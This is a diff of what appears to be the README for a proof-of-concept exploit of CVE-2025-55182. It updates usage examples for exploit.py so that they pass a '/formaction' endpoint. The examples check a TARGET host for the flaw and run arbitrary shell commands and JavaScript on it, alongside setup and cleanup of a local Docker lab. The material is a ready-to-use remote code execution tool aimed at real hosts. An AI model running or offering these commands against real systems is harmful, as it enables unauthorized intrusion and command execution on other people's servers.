@@ -21,8 +21,8 @@ sleep 3
 python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --check
 
 # Execute commands
-python3 exploit.py --ip localhost --port 3002 --cmd "id"
-python3 exploit.py --ip localhost --port 3002 --cmd "whoami" --no-ssl-verify
+python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --cmd "id"
+python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --cmd "whoami" --no-ssl-verify
 
 # Cleanup
 docker stop cve-2025-55182 && docker rm cve-2025-55182
@@ -39,13 +39,13 @@ https://github.com/ejpir/CVE-2025-55182-poc/blob/main/src/server.js
 This route should be replaced for real-life scenario.
 
 # Check vulnerability
-python3 exploit.py --ip TARGET --port 3002 --check
+python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/formaction" --check
 
 # Execute command
-python3 exploit.py --ip TARGET --port 3002 --cmd "COMMAND"
+python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/formaction" --cmd "COMMAND"
 
 # Execute JavaScript
-python3 exploit.py --url http://TARGET:3002 --code "Math.PI * 2"
+python3 exploit.py --url http://TARGET:3002 --post-endpoint "/formaction" --code "Math.PI * 2"
 
 # Use custom endpoint
 python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami" --no-ssl-verify
